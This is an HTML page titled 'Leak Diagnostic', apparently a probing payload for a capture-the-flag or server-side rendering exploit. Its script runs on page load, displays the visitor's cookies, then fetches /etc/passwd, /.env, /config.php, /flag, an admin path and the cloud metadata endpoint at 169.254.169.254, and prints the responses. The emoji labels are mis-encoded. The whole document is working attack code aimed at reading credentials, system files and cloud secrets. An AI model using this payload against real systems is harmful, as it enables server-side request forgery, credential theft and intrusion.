<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Leak Diagnostic</title>
  <style>
    body { font-family: monospace; white-space: pre-wrap; padding: 2em; background: #111; color: #0f0; }
    h1 { color: #fff; }
  </style>
</head>
<body>
  <h1>Leak Diagnostic Page</h1>
  <div id="output">Initializing...</div>
  <script>
    (async () => {
      const output = document.getElementById('output');
      let result = "";

      result += "âœ… JS Executed Successfully\n\n";

      result += "ğŸ“ Location: " + window.location.href + "\n\n";
      result += "ğŸ§­ User Agent: " + navigator.userAgent + "\n\n";
      result += "ğŸª Cookies: " + document.cookie + "\n\n";

      const paths = [
        '/etc/passwd',
        '/.env',
        '/flag',
        '/admin/secret',
        '/config.php',
        'http://169.254.169.254/latest/meta-data/'
      ];

      for (const path of paths) {
        try {
          result += `ğŸŒ Trying to fetch: ${path}\n`;
          const res = await fetch(path);
          result += `ğŸ” Status: ${res.status} ${res.statusText}\n`;
          const text = await res.text();
          result += `ğŸ“„ Content Preview (${text.length} bytes):\n${text.slice(0, 500)}\n\n`;
        } catch (err) {
          result += `âŒ Fetch to ${path} failed: ${err.message}\n\n`;
        }
      }

      output.textContent = result;
    })();
  </script>
</body>
</html>
